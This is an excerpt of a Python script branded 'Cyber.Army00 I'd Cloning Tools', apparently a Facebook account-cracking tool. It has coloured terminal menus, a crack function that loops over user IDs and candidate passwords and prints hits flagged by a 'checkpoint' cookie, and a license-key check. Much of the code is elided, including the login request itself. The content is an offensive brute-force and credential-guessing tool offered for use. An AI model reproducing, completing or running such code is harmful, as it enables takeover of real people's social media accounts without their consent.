...
\x1b[97;1m  ║                                                   ║
\x1b[97;1m  ╠═══════════════════════════════════════════════════╣ 
\x1b[97;1m  ║      [\x1b[91;1m+\x1b[97;1m] \x1b[97;1mCyber.Army00 I'd Cloning Tools\x1b[97;1m  [\x1b[91;1m+\x1b[97;1m]           ║
...
def menu(my_name,my_id):
	...
	_MAMUN_(f'\x1b[1;97m╠══════════════════════════════════════════════════════╝')
	_MAMUN_(f'\x1b[1;97m║\x1b[1;97mYOUR NAME\x1b[1;97m    :\x1b[1;97m '+str(SHOHAG_NAME)) 
	...
	if _____MAMUN_____ in ['2']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/profile.php?id=Cyber.Army00")
...
def passwrd():
	print(f'\x1b[1;97m╠══════════════════════════════════════════════════════╗ ')
	print(f"\x1b[1;97m║==|>[√] YOUR NAME         : \x1b[1;97m"+str(SHOHAG_NAME)) 
	print(f"\x1b[1;97m║==|>[√] TOTAL ID          : \x1b[1;97m"+str(len(id)))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [Cyber] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;97m[CYBER-CP] [💔] {idf} | {pw}{N}')     
...
def RMX():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97mYOUR KEY :\x1b[1;92m CYBER='+id)
      print('\x1b[1;97m┗─────────────────────────────────────────┛')
      os.system('')
      time.sleep(3)
      sys.exit()
